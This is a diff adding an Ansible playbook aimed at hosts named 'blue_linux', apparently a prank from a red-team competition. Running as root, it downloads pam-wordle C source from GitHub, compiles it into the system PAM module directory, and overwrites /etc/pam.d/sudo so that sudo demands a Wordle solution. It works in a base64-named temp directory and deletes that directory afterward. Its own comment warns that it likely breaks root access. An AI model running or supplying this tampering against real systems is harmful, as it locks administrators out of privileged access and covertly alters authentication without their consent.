@@ -1,0 +1,56 @@
+
+# NOTE: This playbook will likely break Ansible's abilitiy to become root.
+# To avoid this add an entry in /etc/sudoers to allow the Ansible user to use sudo without authentication.
+
+- name: Sudo Wordle
+  hosts: blue_linux
+  tasks:
+    - name: Install required packages
+      become: yes
+      apt:
+        name: 
+          - wamerican
+          - gcc
+          - libpam0g-dev
+        update_cache: true
+
+    - name: Create tmp directory to work in
+      file:
+        path: /tmp/c3Vkb3dvcmRsZQ
+        state: directory
+    
+    - name: Fetch pam-wordle source
+      become: yes
+      get_url:
+        url: https://raw.githubusercontent.com/lukem1/pam-wordle/main/wordle.c
+        dest: /tmp/c3Vkb3dvcmRsZQ/wordle.c
+        mode: '0700'
+
+    - name: Compile pam-wordle
+      become: yes
+      command: gcc -fPIC -c wordle.c
+      args:
+        chdir: /tmp/c3Vkb3dvcmRsZQ
+
+    - name: Create pam_wordle.so
+      become: yes
+      command: ld -x --shared -o /lib/x86_64-linux-gnu/security/pam_wordle.so wordle.o
+      args:
+        chdir: /tmp/c3Vkb3dvcmRsZQ
+
+    - name: Delete tmp directory
+      file:
+        path: /tmp/c3Vkb3dvcmRsZQ
+        state: absent
+
+    - name: Update PAM configuration
+      become: yes
+      copy:
+        content: |
+          session    required   pam_env.so readenv=1 user_readenv=0
+          session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
+          auth    required pam_unix.so
+          auth    required    pam_wordle.so
+          @include common-account
+          @include common-session-noninteractive
+        dest: /etc/pam.d/sudo
